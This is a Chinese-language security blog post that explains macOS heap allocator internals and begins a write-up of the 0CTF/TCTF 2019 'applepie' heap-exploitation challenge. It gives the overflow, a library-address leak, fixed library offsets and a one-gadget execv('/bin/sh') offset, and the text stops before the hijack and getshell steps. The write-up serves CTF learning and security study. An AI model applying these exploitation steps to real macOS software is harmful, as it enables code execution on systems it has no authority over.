
 <!DOCTYPE HTML>
<html>
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
  
    <title>MacOS Heap Exploit | H o o k | 潜心习安全</title>
    <meta name="viewport" content="width=device-width, initial-scale=1,user-scalable=no">
    
    <meta name="author" content="hook">
    

    
    <meta name="description" content="MacOS的堆利用0CTF / TCTF2019比赛时出了一道MacOS下的堆利用题目，这里以该题为背景介绍下MacOS下的堆利用攻击。前面主要详细介绍下MacOS系统的堆，如果想看利用可跳到后面的applepie exp编写介绍章节。">
<meta name="keywords" content="Mac Heap">
<meta property="og:type" content="article">
<meta property="og:title" content="MacOS Heap Exploit">
<meta property="og:url" content="https://gloxec.github.com/2019/04/08/MacOS Heap Exploit/index.html">
<meta property="og:site_name" content="H o o k | 潜心习安全">
<meta property="og:description" content="MacOS的堆利用0CTF / TCTF2019比赛时出了一道MacOS下的堆利用题目，这里以该题为背景介绍下MacOS下的堆利用攻击。前面主要详细介绍下MacOS系统的堆，如果想看利用可跳到后面的applepie exp编写介绍章节。">
<meta property="og:locale" content="default">
<meta property="og:image" content="https://gloxec.github.com/images/MacOS%20Heap%20Exploit/1.png">
<meta property="og:image" content="https://gloxec.github.com/images/MacOS%20Heap%20Exploit/2.png">
<meta property="og:image" content="https://gloxec.github.com/images/MacOS%20Heap%20Exploit/3.png">
<meta property="og:image" content="https://gloxec.github.com/images/MacOS%20Heap%20Exploit/4.png">
<meta property="og:updated_time" content="2019-04-12T02:11:38.049Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="MacOS Heap Exploit">
<meta name="twitter:description" content="MacOS的堆利用0CTF / TCTF2019比赛时出了一道MacOS下的堆利用题目，这里以该题为背景介绍下MacOS下的堆利用攻击。前面主要详细介绍下MacOS系统的堆，如果想看利用可跳到后面的applepie exp编写介绍章节。">
<meta name="twitter:image" content="https://gloxec.github.com/images/MacOS%20Heap%20Exploit/1.png">

    
    <link rel="alternative" href="/atom.xml" title="H o o k | 潜心习安全" type="application/atom+xml">
    
    
    <link rel="icon" href="/img/favicon.ico">
    
    
    <link rel="apple-touch-icon" href="/img/jacman.jpg">
    <link rel="apple-touch-icon-precomposed" href="/img/jacman.jpg">
    
    <link rel="stylesheet" href="/css/style.css">
</head>
</html>
  <body>
    <header>
      
<div>
		
			<div id="imglogo">
				<a href="/"><img src="/img/logo.png" alt="H o o k | 潜心习安全" title="H o o k | 潜心习安全"></a>
			</div>
			
			<div id="textlogo">
				<h1 class="site-name"><a href="/" title="H o o k | 潜心习安全">H o o k | 潜心习安全</a></h1>
				<h2 class="blog-motto"></h2>
			</div>
			<div class="navbar"><a class="navbutton navmobile" href="#" title="Menu">
			</a></div>
			<nav class="animated">
				<ul>
					<ul>
					 
						<li><a href="/">Home</a></li>
					
						<li><a href="/archives">Archives</a></li>
					
						<li><a href="/about">About</a></li>
					
					<li>
 					
					<form class="search" action="//google.com/search" method="get" accept-charset="utf-8">
						<label>Search</label>
						<input type="search" id="search" name="q" autocomplete="off" maxlength="20" placeholder="Search">
						<input type="hidden" name="q" value="site:gloxec.github.com">
					</form>
					
					</li>
				</ul>
			</ul></nav>			
</div>
    </header>
    <div id="container">
      <div id="main" class="post" itemscope itemprop="blogPost">
  
	<article itemprop="articleBody"> 
		<header class="article-info clearfix">
  <h1 itemprop="name">
    
      <a href="/2019/04/08/MacOS Heap Exploit/" title="MacOS Heap Exploit" itemprop="url">MacOS Heap Exploit</a>
  </h1>
  <p class="article-author">By
       
		<a href="/about" title="hook" target="_blank" itemprop="author">hook</a>
		
  </p><p class="article-time">
    <time datetime="2019-04-08T03:15:37.000Z" itemprop="datePublished"> Published 2019-04-08</time>
    
  </p>
</header>
	<div class="article-content">
		
		<div id="toc" class="toc-article">
			<strong class="toc-title">Contents</strong>
		
			<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MacOS的堆利用"><span class="toc-number">1.</span> <span class="toc-text">MacOS的堆利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#MacOS下的堆介绍"><span class="toc-number">1.1.</span> <span class="toc-text">MacOS下的堆介绍</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的元数据-metadata"><span class="toc-number">1.1.1.</span> <span class="toc-text">堆的元数据(metadata)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的释放-chunk本身的变化"><span class="toc-number">1.1.2.</span> <span class="toc-text">堆的释放 - chunk本身的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#tiny堆："><span class="toc-number">1.1.2.1.</span> <span class="toc-text">tiny堆：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#small堆"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">small堆</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的释放-chunk元数据-metadata-的变化"><span class="toc-number">1.1.3.</span> <span class="toc-text">堆的释放 - chunk元数据(metadata)的变化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#mag-free-list"><span class="toc-number">1.1.3.1.</span> <span class="toc-text">mag_free_list</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#mag-free-bit-map"><span class="toc-number">1.1.3.2.</span> <span class="toc-text">mag_free_bit_map</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的释放-checksum"><span class="toc-number">1.1.4.</span> <span class="toc-text">堆的释放 - checksum</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#magazine-t"><span class="toc-number">1.1.5.</span> <span class="toc-text">magazine_t</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#堆的申请"><span class="toc-number">1.1.6.</span> <span class="toc-text">堆的申请</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#题目攻击思路"><span class="toc-number">1.2.</span> <span class="toc-text">题目攻击思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用MacOS堆的特性leak-libsystem-c-dylib"><span class="toc-number">1.2.1.</span> <span class="toc-text">利用MacOS堆的特性leak libsystem_c.dylib</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#libsystem-malloc-dylib地址"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">libsystem_malloc.dylib地址</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#libsystem-c-dylib地址"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">libsystem_c.dylib地址</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OneGadget-RCE"><span class="toc-number">1.2.2.</span> <span class="toc-text">OneGadget RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持程序流-前置"><span class="toc-number">1.2.3.</span> <span class="toc-text">劫持程序流 - 前置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#libsystem-c-dylib-DATA"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">libsystem_c.dylib DATA</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#劫持程序流-核心"><span class="toc-number">1.2.4.</span> <span class="toc-text">劫持程序流 - 核心</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getshell"><span class="toc-number">1.3.</span> <span class="toc-text">getshell</span></a></li></ol></li></ol>
		
		</div>
		
		<h1 id="MacOS的堆利用"><a href="#MacOS的堆利用" class="headerlink" title="MacOS的堆利用"></a>MacOS的堆利用</h1><p><strong>0CTF / TCTF2019</strong>比赛时出了一道MacOS下的堆利用题目，这里以该题为背景介绍下MacOS下的堆利用攻击。前面主要详细介绍下MacOS系统的堆，如果想看利用可跳到后面的<code>applepie exp编写</code>介绍章节。</p>
<a id="more"></a>
<h2 id="MacOS下的堆介绍"><a href="#MacOS下的堆介绍" class="headerlink" title="MacOS下的堆介绍"></a>MacOS下的堆介绍</h2><p>MacOS高版本系统使用Magazine Allocator进行堆分配，低版本使用Scalable Allocator，详细结构这里不做介绍，它在分配时按照申请大小将堆分为三类<strong>tiny</strong>,<strong>small</strong>,<strong>large</strong><br>其中tiny&amp;small用一个叫做 <strong>Quantum ( Q )</strong>的单位管理</p>
<ul>
<li><strong>tiny</strong> (Q = 16) ( <strong>tiny</strong> &lt; 1009B )</li>
<li><strong>small</strong> (Q = 512) ( 1008B &lt; <strong>small</strong> &lt; 127KB )</li>
<li><strong>large</strong> ( 127KB &lt; <strong>large</strong> )</li>
</ul>
<p>每个magazine有个cache区域可以用来快速分配释放堆</p>
<h3 id="堆的元数据-metadata"><a href="#堆的元数据-metadata" class="headerlink" title="堆的元数据(metadata)"></a>堆的元数据(metadata)</h3><p>MacOS的堆分配方式和其他系统不同，没有采用<code>Linked List</code>方式的分配，堆的前后并没有带堆的元数据，而是将元数据存放在了其他地方，并且做了一系列措施方式防止堆溢出修改元数据。<br>每个进程包含3个区域，分别为<strong>tiny rack</strong>, <strong>small rack</strong>, <strong>large allocations</strong></p>
<table>
<thead>
<tr>
<th>tiny rack</th>
<th>small rack</th>
<th>large allocations</th>
</tr>
</thead>
<tbody>
<tr>
<td>magazine</td>
<td>magazine</td>
<td></td>
</tr>
<tr>
<td>magazine</td>
<td>magazine</td>
<td></td>
</tr>
<tr>
<td>magazine</td>
<td>magazine</td>
<td></td>
</tr>
<tr>
<td>…</td>
<td>…</td>
<td></td>
</tr>
<tr>
<td>magazine</td>
<td>magazine</td>
</tr>
</tbody>
</table>
<p>每个区域包含了多个活动可变的magazine区域<br>magazine中有n多个”Region”<br>这个叫”Region”的区域大小在tiny rack和small rack中是不同的，<br>“Region” in Tiny rack = 1MB<br>“Region” in Small rack = 8MB</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">tiny rack&#123;</span><br><span class="line">    magazine 1 &#123;</span><br><span class="line">        Region 1 &#123;&#125;</span><br><span class="line">        Region 2 &#123;&#125;</span><br><span class="line">        ...</span><br><span class="line">        Region n &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">    magazine 2 &#123;&#125;</span><br><span class="line">    ...</span><br><span class="line">    magazine 3 &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">small rack&#123;</span><br><span class="line">    ...</span><br><span class="line">    magazine n &#123;&#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>“Region”中包含三样东西，一个是以<strong>Q</strong>为单位的内存block, 还有个是负责将各个”Region”关联起来的<strong>trailer</strong>另外一个就是记录chunk信息的<strong>metadata</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">tiny Region &#123;</span><br><span class="line">    Q(1Q = 16) * 64520个</span><br><span class="line">    region_trailer_t trailer</span><br><span class="line">    metadata[64520/sizeof(uint32_t)] &#123;</span><br><span class="line">        bitmaps[0]: uint32_t header = 描述哪个block是起始chunk</span><br><span class="line">        bitmaps[1]: uint32_t inuse = 描述chunk状态(busy/free)</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Small Region &#123;</span><br><span class="line">    Q(1Q = 512) * 16320个</span><br><span class="line">    region_trailer_t trailer</span><br><span class="line">    metadata[16320] &#123;</span><br><span class="line">        bitmaps[0]: uint16_t msize = 最高一位描述chunk状态(busy/free), 其余位描述chunk的Q值（Q值代表与下一个chunk相差多少个Q）</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>large allocations保存在cache中，直接记录地址和大小，除非是分割严重，否则一般不会被unmmap</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">large &#123;</span><br><span class="line">    address</span><br><span class="line">    size</span><br><span class="line">    did_madvise_reusable</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="堆的释放-chunk本身的变化"><a href="#堆的释放-chunk本身的变化" class="headerlink" title="堆的释放 - chunk本身的变化"></a>堆的释放 - chunk本身的变化</h3><h4 id="tiny堆："><a href="#tiny堆：" class="headerlink" title="tiny堆："></a><strong>tiny堆</strong>：</h4><blockquote>
<p>tiny堆在释放时，将该chunk挂在freelist上，这里和Linux类似</p>
</blockquote>
<p>比较有意思的一点是，tiny堆在释放时，会在chunk上<strong>写入元数据</strong>，我们值得关心的就是这一点</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -----------------------------------------------</span><br><span class="line"># AAAAA....</span><br><span class="line">#           </span><br><span class="line">#                   ...AAA...  </span><br><span class="line">#                                       .....AAAA</span><br><span class="line"># -----------------------------------------------</span><br><span class="line">#                       |</span><br><span class="line">#                       | after free</span><br><span class="line">#                       |</span><br><span class="line">#                       ↓</span><br><span class="line"># -----------------------------------------------</span><br><span class="line"># checksum(prev_pointer) | checksum(next_pointer)</span><br><span class="line">#           size         | ...</span><br><span class="line">#                       ...</span><br><span class="line">#                        | size</span><br><span class="line"># -----------------------------------------------</span><br></pre></td></tr></table></figure>
<p>这里有两个pointer和Linux上chunk的头极其相似，同样的，它们的作用也一样，在freelist上获取chunk时将会用这个pointer来进行链表的操作，还有chunk在free时，会进行合并检查，然后用这两个pointer进行unlink操作。<br><strong><em>但是</em></strong>这里如果按照Linux的方式去攻击堆时，就会发现这里的checksum会阻止堆的元数据被溢出修改。<code>后面会大致介绍这里的checksum</code></p>
<p>关于tiny堆释放时的需要注意的另外一个点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a1 = malloc(496)</span><br><span class="line">a2 = malloc(496)</span><br><span class="line">a3 = malloc(496)</span><br><span class="line">free(a1)</span><br><span class="line">free(a3)</span><br><span class="line">#这里会发现a1, a3会的prev_pointer &amp; next_pointer会正确的关联起来</span><br><span class="line">free(a2)</span><br><span class="line">#当a2也free之后，会发现a2, a3的头部被清空，a1头部的size却是三者之和，并且移动到small堆中</span><br></pre></td></tr></table></figure>
<h4 id="small堆"><a href="#small堆" class="headerlink" title="small堆"></a><strong>small堆</strong></h4><p>small堆与tiny堆不同，释放后会先移动到cache中，等到下一个small堆被free时，当前的才会被移动到freelist中</p>
<h3 id="堆的释放-chunk元数据-metadata-的变化"><a href="#堆的释放-chunk元数据-metadata-的变化" class="headerlink" title="堆的释放 - chunk元数据(metadata)的变化"></a>堆的释放 - chunk元数据(metadata)的变化</h3><h4 id="mag-free-list"><a href="#mag-free-list" class="headerlink" title="mag_free_list"></a>mag_free_list</h4><p>这里便是要讲上文提到的freelist,<code>mag_free_list</code>是个负责存放地址的列表，一共包含32个元素，各个元素处储存着已经free的对应<strong>Q</strong>值的chunk地址，前31个分别是从1Q~31Q的chunk freelist，第32个存放比31Q还要大的chunk freelist。<br>当新的chunk被free时，将按照chunk的大小，存放在对应Q值的freelist上，并按照双向链表设置好checksum(prev_pointer), checksum(next_pointer) {参照Linux的freelist}</p>
<h4 id="mag-free-bit-map"><a href="#mag-free-bit-map" class="headerlink" title="mag_free_bit_map"></a>mag_free_bit_map</h4><p>这个则如名字所示，按位来标记Q(n)是否具有freelist</p>
<h3 id="堆的释放-checksum"><a href="#堆的释放-checksum" class="headerlink" title="堆的释放 - checksum"></a>堆的释放 - checksum</h3><p>程序在运行时，都会随机生成一个cookie，这个cookie会pointer进行下面的计算生成一个checksum, 然后将(checksum &lt;&lt; 56 ) | (pointer &gt;&gt; 4)运算后将checksum保存在高位上，以便检测堆的元数据是否被溢出破坏</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">static MALLOC_INLINE uintptr_t</span><br><span class="line">free_list_checksum_ptr(rack_t *rack, void *ptr)</span><br><span class="line">&#123;</span><br><span class="line">	uintptr_t p = (uintptr_t)ptr;</span><br><span class="line">	return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static MALLOC_INLINE void *</span><br><span class="line">free_list_unchecksum_ptr(rack_t *rack, inplace_union *ptr)</span><br><span class="line">&#123;</span><br><span class="line">	inplace_union p;</span><br><span class="line">	uintptr_t t = ptr-&gt;u;</span><br><span class="line"></span><br><span class="line">	t = (t &lt;&lt; NYBBLE) | (t &gt;&gt; ANTI_NYBBLE); // compiles to rotate instruction</span><br><span class="line">	p.u = t &amp; ~(uintptr_t)0xF;</span><br><span class="line"></span><br><span class="line">	if ((t ^ free_list_gen_checksum(p.u ^ rack-&gt;cookie)) &amp; (uintptr_t)0xF) &#123;</span><br><span class="line">		free_list_checksum_botch(rack, ptr, (void *)ptr-&gt;u);</span><br><span class="line">		__builtin_trap();</span><br><span class="line">	&#125;</span><br><span class="line">	return p.p;</span><br><span class="line">&#125;</span><br><span class="line">static MALLOC_INLINE uintptr_t</span><br><span class="line">free_list_gen_checksum(uintptr_t ptr)</span><br><span class="line">&#123;</span><br><span class="line">	uint8_t chk;</span><br><span class="line"></span><br><span class="line">	chk = (unsigned char)(ptr &gt;&gt; 0);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 8);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 16);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 24);</span><br><span class="line">#if __LP64__</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 32);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 40);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 48);</span><br><span class="line">	chk += (unsigned char)(ptr &gt;&gt; 56);</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">	return chk;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="magazine-t"><a href="#magazine-t" class="headerlink" title="magazine_t"></a>magazine_t</h3><p>这个则包含了上述介绍过的各种数据，比如chunk cache, 以及mag_free_bit_map, mag_free_list, 以及最后一个被使用的region, 以及所有region的链表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">struct magazine_t &#123;</span><br><span class="line">    ...</span><br><span class="line">    void *mag_last_free;</span><br><span class="line">    unsigned[8] mag_bitmap;</span><br><span class="line">    free_list_t*[256] mag_free_list;</span><br><span class="line">    region_t mag_last_region;</span><br><span class="line">    region_trailer_t *firstNode, *lastNode;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="堆的申请"><a href="#堆的申请" class="headerlink" title="堆的申请"></a>堆的申请</h3><p>整个申请流程是首先从cache中寻找是否有对应的堆，如果没有接着从freelist中寻找，没找到再从region中去申请</p>
<h2 id="题目攻击思路"><a href="#题目攻击思路" class="headerlink" title="题目攻击思路"></a>题目攻击思路</h2><p>首先题目保护全开，具有PIE，再分析程序流程。<br>程序整个流程就是以下面的结构体进行堆数据操作。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct mem &#123;</span><br><span class="line">    int StyleTableIndex</span><br><span class="line">    int ShapeTableIndex</span><br><span class="line">    int Time</span><br><span class="line">    int NameSize</span><br><span class="line">    char *NameMem</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>溢出</li>
</ul>
<p>发现在update()更新mem时，可以随意设定当前mem-&gt;nameSize的大小，导致修改name时，可溢出修改name后的下一块mem的数据。<br>但是修改的size发现做了限制，导致数据溢出最大只能修改到mem结构的前三项<br>mem-&gt;StyleTableIndex<br>mem-&gt;ShapeTableIndex<br>mem-&gt;Time<br><img src="/images/MacOS Heap Exploit/1.png" alt></p>
<ul>
<li>leak</li>
</ul>
<p>在show()显示时，可以用StyleTable[offset/8]来leak数据</p>
<p>因为有PIE的存在，程序每次运行堆栈地址都会随机，所以整个利用思路就是先leak libsystem_c.dylib的地址，接着利用heap操作产生的漏洞去将包含的execv(‘/bin/sh’)代码运行地址写入可以劫持到程序流程的地方。</p>
<h3 id="利用MacOS堆的特性leak-libsystem-c-dylib"><a href="#利用MacOS堆的特性leak-libsystem-c-dylib" class="headerlink" title="利用MacOS堆的特性leak libsystem_c.dylib"></a>利用MacOS堆的特性leak libsystem_c.dylib</h3><p>查看程序运行时的vmmap，可以看到程序下方有个Malloc metadata的region，这里开头存放的就是DefaultZone<br><img src="/images/MacOS Heap Exploit/2.png" alt><br>我们可以看下libmalloc的源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">typedef struct _malloc_zone_t &#123;</span><br><span class="line">    /* Only zone implementors should depend on the layout of this structure;</span><br><span class="line">    Regular callers should use the access functions below */</span><br><span class="line">    void	*reserved1;	/* RESERVED FOR CFAllocator DO NOT USE */</span><br><span class="line">    void	*reserved2;	/* RESERVED FOR CFAllocator DO NOT USE */</span><br><span class="line">    size_t 	(* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */</span><br><span class="line">    void 	*(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);</span><br><span class="line">    void 	*(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */</span><br><span class="line">    void 	*(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */</span><br><span class="line">    void 	(* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);</span><br><span class="line">    void 	*(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);</span><br><span class="line">    void 	(* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */</span><br><span class="line">    const char	*zone_name;</span><br><span class="line"></span><br><span class="line">    /* Optional batch callbacks; these may be NULL */</span><br><span class="line">    unsigned	(* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */</span><br><span class="line">    void	(* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */</span><br><span class="line"></span><br><span class="line">    struct malloc_introspection_t	* MALLOC_INTROSPECT_TBL_PTR(introspect);</span><br><span class="line">    unsigned	version;</span><br><span class="line">    	</span><br><span class="line">    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */</span><br><span class="line">    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);</span><br><span class="line">    </span><br><span class="line">    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/</span><br><span class="line">    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);</span><br><span class="line"></span><br><span class="line">    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */</span><br><span class="line">    size_t 	(* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);</span><br><span class="line"></span><br><span class="line">	/*</span><br><span class="line">	 * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.</span><br><span class="line">	 * False positives are allowed (e.g. the pointer was freed, or it&apos;s in zone space that has</span><br><span class="line">	 * not yet been allocated. False negatives are not allowed.</span><br><span class="line">	 */</span><br><span class="line">    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);</span><br><span class="line">&#125; malloc_zone_t;</span><br></pre></td></tr></table></figure>
<p>值得我们仔细关注的是这里的<br><code>struct malloc_introspection_t   * MALLOC_INTROSPECT_TBL_PTR(introspect);</code></p>
<p>继续查看源代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct malloc_introspection_t &#123;</span><br><span class="line">	kern_return_t (* MALLOC_INTROSPECT_FN_PTR(enumerator))(task_t task, void *, unsigned type_mask, vm_address_t zone_address, memory_reader_t reader, vm_range_recorder_t recorder); /* enumerates all the malloc pointers in use */</span><br><span class="line">	size_t	(* MALLOC_INTROSPECT_FN_PTR(good_size))(malloc_zone_t *zone, size_t size);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用之前介绍过的堆资料，可以知道<br>所以DefaultZone-&gt;introspect-&gt;enumerator这里储存了enumerator对应的函数<code>szone_ptr_in_use_enumerator</code>的地址</p>
<h4 id="libsystem-malloc-dylib地址"><a href="#libsystem-malloc-dylib地址" class="headerlink" title="libsystem_malloc.dylib地址"></a>libsystem_malloc.dylib地址</h4><p>所以<br>libsystem_malloc.dylib的地址 = leak出的<code>szone_ptr_in_use_enumerator地址 - sznoe偏移量(0x0000000000013D68)</code></p>
<h4 id="libsystem-c-dylib地址"><a href="#libsystem-c-dylib地址" class="headerlink" title="libsystem_c.dylib地址"></a>libsystem_c.dylib地址</h4><p>这里有个很有趣的现象，就是MacOS的PIE会保证程序每次运行时都会随机堆栈以及加载地址，但是引入的动态库地址不会产生变化，似乎只会在开机时变化。<br>所以可以看下vmmap，确定下libsystem_c.dylib与libsystem_malloc.dylib加载地址，得到偏移量。<br><code>libsystem_c.dylib = libsystem_malloc.dylib - 偏移量(0x161000)</code></p>
<h3 id="OneGadget-RCE"><a href="#OneGadget-RCE" class="headerlink" title="OneGadget RCE"></a>OneGadget RCE</h3><p>分析了libsystem_c.dylib,发现了与Linux libc中同样的execv(‘/bin/sh’)代码片段<br><code>onegadget rce = libsystem_c.dylib + 0x0000000000025D94</code><br><img src="/images/MacOS Heap Exploit/3.png" alt></p>
